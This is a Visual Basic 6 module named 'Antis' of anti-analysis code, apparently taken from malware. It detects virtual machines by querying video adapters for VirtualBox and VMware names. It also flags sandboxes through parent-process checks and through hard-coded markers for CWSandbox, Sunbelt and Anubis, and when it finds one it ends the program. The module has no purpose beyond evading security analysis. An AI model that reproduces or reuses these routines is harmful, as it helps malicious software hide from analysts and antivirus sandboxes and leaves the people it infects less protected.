Attribute VB_Name = "Antis"


Option Explicit

Private Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Private Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Sub CloseHandle Lib "kernel32" (ByVal hObject As Long)
Private Declare Function P_ID Lib "kernel32" () As Long
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Const TH32CS_SNAPPROCESS = &H2
Private Const MAX_PATH As Long = 260

Private Type PROCESSENTRY32
dwSize As Long
cntUsage As Long
th32ProcessID As Long
th32DefaultHeapID As Long
th32ModuleID As Long
cntThreads As Long
th32ParentProcessID As Long
pcPriClassBase As Long
dwFlags As Long
szExeFile As String * MAX_PATH
End Type
Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long

    Public Function Sandboxed() As Boolean
    Dim nSnapshot As Long, nProcess As PROCESSENTRY32
    Dim nResult As Long, ParentID As Long, IDCheck As Boolean
    Dim nProcessID As Long

   
    nProcessID = GetCurrentProcessId
    If nProcessID <> 0 Then
   
    nSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    If nSnapshot <> 0 Then
      nProcess.dwSize = Len(nProcess)

      
      nResult = ProcessFirst(nSnapshot, nProcess)

      Do Until nResult = 0
    
       If nProcess.th32ProcessID = nProcessID Then
       
      
        ParentID = nProcess.th32ParentProcessID
       
     
        nResult = ProcessFirst(nSnapshot, nProcess)
        Do Until nResult = 0
       
         If nProcess.th32ProcessID = ParentID Then
         
          IDCheck = False
          Exit Do
         Else
          IDCheck = True
          nResult = ProcessNext(nSnapshot, nProcess)
         End If
        Loop
       
       
        Sandboxed = IDCheck
       
        Exit Do
       Else
       
        nResult = ProcessNext(nSnapshot, nProcess)
       End If
      Loop

      CloseHandle nSnapshot
    End If
    End If
    End Function
Function vm()
  Dim oAdapters As Object
  Dim oCard As Object
  Dim SQL As String
                        
' Abfrage erstellen
  SQL = "SELECT * FROM Win32_VideoController"
  Set oAdapters = GetObject("winmgmts:").ExecQuery(SQL)
  
  ' Auflisten aller Grafikadapter
  For Each oCard In oAdapters
    Select Case oCard.Description
    
        Case "VM Additions S3 Trio32/64"
        End
        
        Case "S3 Trio32/64"
        End
        
        Case "VirtualBox Graphics Adapter"
        End
        
        
        Case "VMware SVGA II"
        End
 
        Case ""
        End
        
    End Select
Next
End Function
Public Function Sandboxhelp()
If Sandboxed() Then
    End
End If
End Function

Public Function BDSandbox() As Long
BDSandbox = False
End Function




Public Function IsCWSandbox() As Boolean
    If App.Path = "H:\" And Environ("username") = "Schmidti" Then IsCWSandbox = True
End Function

Public Function IsSunbelt() As Boolean
    If App.EXEName = "file" And App.Path = "C:\" Then IsSunbelt = True
End Function


Public Function IsInAnubis() As Boolean
    Dim szBuffer As String * 255
    GetModuleFileName 0, szBuffer, 255
    If InStr(1, szBuffer, "sample.exe") > 0 Then
        IsInAnubis = True
    End If
End Function


